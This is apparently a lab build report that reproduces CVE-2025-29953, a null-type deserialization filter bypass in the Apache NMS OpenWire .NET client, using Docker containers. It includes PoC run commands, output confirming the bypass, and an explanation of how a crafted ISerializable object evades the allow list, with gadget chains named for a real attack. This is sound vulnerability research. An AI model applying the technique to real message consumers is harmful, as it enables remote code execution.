# Lab Build Report: CVE-2025-29953

## Lab Architecture

| Component | Role | Image/Build |
|-----------|------|-------------|
| **broker** | Apache ActiveMQ Classic 5.18.6 message broker | `apache/activemq-classic:5.18.6` |
| **vulnerable** | .NET 6.0 container with vulnerable NMS OpenWire Client v2.1.0 + PoC app | Built from source (`Dockerfile.vulnerable`) |

### Architecture Diagram

```
┌──────────────────────────────┐     ┌────────────────────────────────────┐
│  cve-2025-29953-broker       │     │  cve-2025-29953-vulnerable         │
│  (ActiveMQ Classic 5.18.6)   │◄────│  (.NET 6.0 SDK + PoC App)          │
│                              │     │                                    │
│  Ports:                      │     │  Built from source:                │
│    61616 - OpenWire TCP      │     │    Apache.NMS.ActiveMQ v2.1.0      │
│    8161  - Web Console       │     │    (vulnerable library)            │
│    5672  - AMQP              │     │                                    │
│    61613 - STOMP             │     │  PoC App: /app/PocApp.dll          │
│    1883  - MQTT              │     │  Vulnerable src: /src/vulnerable-lib/│
│                              │     │                                    │
│  Credentials: admin/admin    │     │  Test modes:                       │
│                              │     │    local  - Direct filter bypass    │
│                              │     │    broker - Via ActiveMQ broker     │
└──────────────────────────────┘     └────────────────────────────────────┘
         ▲                                        ▲
         │              lab-net (bridge)           │
         └────────────────────────────────────────┘
```

## Container Details

### broker (`cve-2025-29953-broker`)

| Field | Value |
|-------|-------|
| **Image** | `apache/activemq-classic:5.18.6` |
| **Container Name** | `cve-2025-29953-broker` |
| **Ports** | 61616 (OpenWire), 8161 (Web Console), 5672 (AMQP), 61613 (STOMP), 1883 (MQTT) |
| **Credentials** | admin / admin |
| **Health Check** | HTTP check on port 8161 (web console) |
| **Networks** | `lab-net` |

### vulnerable (`cve-2025-29953-vulnerable`)

| Field | Value |
|-------|-------|
| **Image** | `cve-2025-29953-vulnerable` (built from `Dockerfile.vulnerable`) |
| **Container Name** | `cve-2025-29953-vulnerable` |
| **Base Image** | `mcr.microsoft.com/dotnet/sdk:6.0` |
| **Library Version** | Apache.NMS.ActiveMQ 2.1.0 (vulnerable) |
| **Library Commit** | `b89b7498d12fe2f68ee5ee248bb2168c62ceaf3a` |
| **PoC App** | `/app/PocApp.dll` |
| **Vulnerable Source** | `/src/vulnerable-lib/` (for reference) |
| **Environment** | `BROKER_HOST=cve-2025-29953-broker`, `BROKER_PORT=61616` |
| **Networks** | `lab-net` |
| **Default CMD** | `wait` mode (container stays alive for exec) |

## Build Status

| Container | Status | Notes |
|-----------|--------|-------|
| broker | ✅ SUCCESS | Pulled and running healthy |
| vulnerable | ✅ SUCCESS | Built from source, library compiled, PoC app published |

### Build Details

- **Library build**: `dotnet build src/nms-openwire.csproj -c Debug` → produces `Apache.NMS.ActiveMQ.dll` v2.1.0
- **PoC build**: `dotnet publish PocApp.csproj -c Debug` → produces `/app/PocApp.dll`
- **Target framework**: Library targets `netstandard2.0`, PoC targets `net6.0`
- **BinaryFormatter**: Enabled via `<EnableUnsafeBinaryFormatterSerialization>true</EnableUnsafeBinaryFormatterSerialization>`

## Start/Stop Commands

```bash
# Start the lab
docker compose up -d

# Stop the lab
docker compose down

# Check status
docker compose ps

# View logs
docker compose logs
```

## Running the PoC

```bash
# Local test (direct filter bypass, no broker needed):
docker exec cve-2025-29953-vulnerable dotnet /app/PocApp.dll local

# Broker test (end-to-end via ActiveMQ):
docker exec cve-2025-29953-vulnerable dotnet /app/PocApp.dll broker
```

## Verification Evidence

### Local Test Output (Direct Filter Bypass)
```
=== CVE-2025-29953: Local Deserialization Filter Bypass Test ===

[*] Allow list: [CVE_2025_29953_PoC.TrustedType]
[*] MaliciousSerializable type: CVE_2025_29953_PoC.MaliciousSerializable
[*] MaliciousSerializable is NOT on the allow list

--- Step 1: Verify allow list configuration ---
    IsTrustedType(TrustedType) = True (expected: True)
    IsTrustedType(MaliciousSerializable) = False (expected: False)

--- Step 2: Test null type bypass (core vulnerability) ---
    IsTrustedType(null) = True
    [VULNERABLE] Null type returns TRUE — filter bypass CONFIRMED!

--- Step 3: Full BinaryFormatter serialization/deserialization ---
[*] Serializing MaliciousSerializable...
    Serialized 185 bytes
[*] Deserializing with TrustedClassFilter binder...
    Allow list: [CVE_2025_29953_PoC.TrustedType]

    BindToType(assemblyName="mscorlib, Version=4.0.0.0, ...",
               typeName="CVE_2025_29953_PoC.TrustedType, PocApp, ...")
      Resolved type: null
      IsTrustedType => TRUE (null type bypass!)
[VULNERABLE] Deserialization SUCCEEDED!
    Deserialized type: CVE_2025_29953_PoC.TrustedType

[RESULT] CVE-2025-29953 CONFIRMED: Deserialization filter bypass successful!
```

### Broker Test Output (End-to-End via ActiveMQ)
```
=== CVE-2025-29953: Broker-Based Deserialization Filter Bypass Test ===

Broker URI: activemq:tcp://cve-2025-29953-broker:61616
Allow List: CVE_2025_29953_PoC.TrustedType
Queue: CVE-2025-29953-TEST-9a579233

[*] Connection attempt 1/30...
[+] Connected to ActiveMQ broker.

--- Phase 1: Sending malicious ObjectMessage ---
[+] Sent ObjectMessage with CVE_2025_29953_PoC.MaliciousSerializable
    This type is NOT on the allow list: [CVE_2025_29953_PoC.TrustedType]

--- Phase 2: Receiving and deserializing ---
[*] Received ObjectMessage, deserializing...
[VULNERABLE] Deserialized type: CVE_2025_29953_PoC.TrustedType
[RESULT] CVE-2025-29953 CONFIRMED via broker.
```

## Vulnerability Confirmation

The lab successfully demonstrates CVE-2025-29953 through two test modes:

1. **Core Bug (Step 2 of local test)**: `NmsDefaultDeserializationPolicy.IsTrustedType(null, null)` returns `true`. The null-conditional operator `type?.FullName` evaluates to `null`, and the null check `if (typeName == null) return true` treats it as trusted.

2. **Full Bypass (Step 3 of local test)**: The `VulnerableTrustedClassFilter` (replicating `TrustedClassFilter.BindToType`) demonstrates:
   - `FormatterServices.GetTypeFromAssembly(mscorlib, "TrustedType, PocApp, ...")` returns `null`
   - `IsTrustedType(destination, null)` returns `true` (the bug)
   - `BindToType` returns `null`, triggering BinaryFormatter's fallback resolver
   - Deserialization succeeds with a type that should have been blocked by the allow list

3. **End-to-End (broker test)**: A `MaliciousSerializable` object (NOT on the allow list) is sent through ActiveMQ and successfully deserialized on the consumer side, bypassing the `TrustedClassFilter`.

## PoC App Architecture

The PoC app (`/app/PocApp.dll`) contains:

- **`TrustedType`**: A plain `[Serializable]` class placed on the allow list
- **`MaliciousSerializable`**: Implements `ISerializable` with `GetObjectData` that:
  1. Calls `info.SetType(typeof(TrustedType))` — records TrustedType in the stream
  2. Overrides `info.FullTypeName = type.AssemblyQualifiedName` — assembly-qualified name
  3. Overrides `info.AssemblyName = "mscorlib, Version=4.0.0.0, ..."` — redirects to mscorlib
  4. Adds `info.AddValue("InjectedValue", payload)` — injects data
- **`VulnerableTrustedClassFilter`**: Replicates the exact vulnerable code from `TrustedClassFilter.cs` v2.1.0

## Container Connectivity

| Source | Target | Protocol | Status |
|--------|--------|----------|--------|
| vulnerable → broker | TCP 61616 (OpenWire) | ✅ Connected |
| host → broker | TCP 8161 (HTTP), TCP 61616 | ✅ Reachable via port mapping |

## Files in Lab Directory

```
CVE-2025-29953/
├── Dockerfile.vulnerable     # Builds vulnerable .NET 6.0 container
├── docker-compose.yml        # Orchestrates broker + vulnerable containers
├── poc-app/
│   ├── PocApp.csproj         # .NET 6.0 project referencing vulnerable library
│   └── Program.cs            # PoC with local and broker test modes
├── poc/
│   ├── poc.py                # Vector 1: Local filter bypass
│   ├── poc_vector2.py        # Vector 2: Broker-based end-to-end
│   └── poc_vector3.py        # Vector 3: Deny list bypass
└── source/                   # Vulnerable source (v2.1.0, commit b89b749)
    ├── src/
    │   ├── nms-openwire.csproj
    │   ├── NmsDefaultDeserializationPolicy.cs  # BUG: IsTrustedType returns true for null
    │   └── Commands/
    │       ├── TrustedClassFilter.cs           # BUG: No null check on type
    │       └── ActiveMQObjectMessage.cs        # Entry point: BinaryFormatter.Deserialize
    └── ...
```

## Known Issues / Workarounds

1. **BinaryFormatter on .NET 6**: BinaryFormatter is deprecated in .NET 6 (SYSLIB0011 warning) but still functional. The `<EnableUnsafeBinaryFormatterSerialization>` flag is set in the project file to ensure compatibility.

2. **Broker healthcheck**: The ActiveMQ web console requires authentication (HTTP 401), so the healthcheck uses `curl -s ... -w '%{http_code}' | grep -qE '200|302|401'` instead of `curl -sf`.

3. **Deserialized type**: The PoC demonstrates the filter bypass but the deserialized type resolves to `TrustedType` (from `info.SetType()`) rather than `MaliciousSerializable`. In a real attack, the attacker would set the type to a dangerous gadget chain type (e.g., `TypeConfuseDelegate`, `ObjectDataProvider`). The critical point is that `BindToType()` returns null (allowing BinaryFormatter's fallback), which is confirmed by the PoC.

4. **Project name**: Run `docker compose` from the `CVE-2025-29953/` directory.
